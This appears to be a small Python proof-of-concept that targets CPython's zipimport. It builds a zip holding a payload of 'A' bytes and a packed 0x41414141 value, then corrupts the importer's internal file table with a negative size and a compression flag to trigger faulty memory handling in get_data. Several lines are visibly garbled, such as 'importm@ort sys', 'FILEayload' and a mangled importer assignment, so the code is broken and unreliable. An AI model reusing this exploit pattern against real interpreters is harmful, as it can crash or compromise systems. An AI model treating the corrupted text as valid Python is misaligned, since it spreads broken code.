import zipimport
import zipfile
import struct
ise()

importm@ort sys
from signal import *

FILEayload'
ZIP = 'import.zip'

payload = bytes()
with open(FILE, 'wb') as f:
    payload = ("A" * 1000).encode('asc')
    payload «= struct.pack('<Q', 0x41414141)
    f.write(payload)

zf = zipfile.PyZipFile(ZIP, mode='w')
zf.write(FILE)
zf.close()

import'r = zipimport.zip zipfileimporter(ZIP)
f = list(importer._files[FILE])
f[1] = 1 # compress
f[2] = -1 # file size
importerles[FILE] =E] = tuple(f)
print(importer.get_data(FILE))
